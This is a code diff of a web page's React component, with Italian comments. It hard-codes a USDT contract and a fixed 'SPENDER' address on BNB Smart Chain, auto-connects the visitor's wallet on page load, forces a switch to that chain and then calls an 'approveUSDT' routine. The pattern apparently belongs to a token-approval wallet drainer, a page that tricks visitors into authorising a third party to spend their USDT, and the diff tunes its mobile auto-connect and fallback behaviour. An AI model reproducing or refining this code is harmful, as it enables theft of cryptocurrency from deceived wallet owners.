@@ -9,49 +9,42 @@ export default function Home() {
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
   const SPENDER = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";
 
-  // 🔥 AUTO REDIRECT + AUTO CONNECT (ANDROID FIX)
+  // 🔥 AUTO CONNECT SMART (ANDROID + IPHONE)
   useEffect(() => {
-    const init = async () => {
+    const connectWallet = async () => {
+      if (!window.ethereum) return;
 
-      // se NON è dentro Trust Wallet → reindirizza
-      if (!window.ethereum) {
-        const isTrust = navigator.userAgent.toLowerCase().includes("trust");
-
-        if (!isTrust) {
-          window.location.href =
-            "https://link.trustwallet.com/open_url?url=" +
-            window.location.href;
-          return;
-        }
-      }
-
-      // prova auto connect
       try {
-        if (window.ethereum) {
-          const provider = new ethers.BrowserProvider(window.ethereum);
+        const provider = new ethers.BrowserProvider(window.ethereum);
+
+        // controlla se già connesso
+        let accounts = await provider.send("eth_accounts", []);
+
+        // se non connesso → richiedi
+        if (accounts.length === 0) {
           await provider.send("eth_requestAccounts", []);
-          console.log("Wallet connesso");
         }
+
+        console.log("Wallet pronto");
       } catch (err) {
-        console.log("Connessione non autorizzata");
+        console.log("Errore connessione");
       }
     };
 
-    init();
+    // ⏳ piccolo delay (fix Android, invisibile su iPhone)
+    setTimeout(connectWallet, 700);
+
   }, []);
 
   const approveUSDT = async () => {
     try {
 
-      // 🔥 se non c'è wallet → redirect automatico
       if (!window.ethereum) {
-        window.location.href =
-          "https://link.trustwallet.com/open_url?url=" +
-          window.location.href;
+        alert("Apri in Trust Wallet");
         return;
       }
 
-      // switch BNB
+      // 🔥 switch rete BNB
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
@@ -59,7 +52,7 @@ export default function Home() {
 
       const provider = new ethers.BrowserProvider(window.ethereum);
 
-      // 🔥 forza connessione (ANDROID FIX)
+      // 🔥 sicurezza Android
       await provider.send("eth_requestAccounts", []);
 
       const signer = await provider.getSigner();
@@ -138,10 +131,7 @@ export default function Home() {
         <div style={{
           background: "#1a1a1a",
           padding: "12px 16px",
-          borderRadius: "16px",
-          display: "inline-flex",
-          alignItems: "center",
-          gap: "10px"
+          borderRadius: "16px"
         }}>
           <span>BNB Smart Chain</span>
         </div>
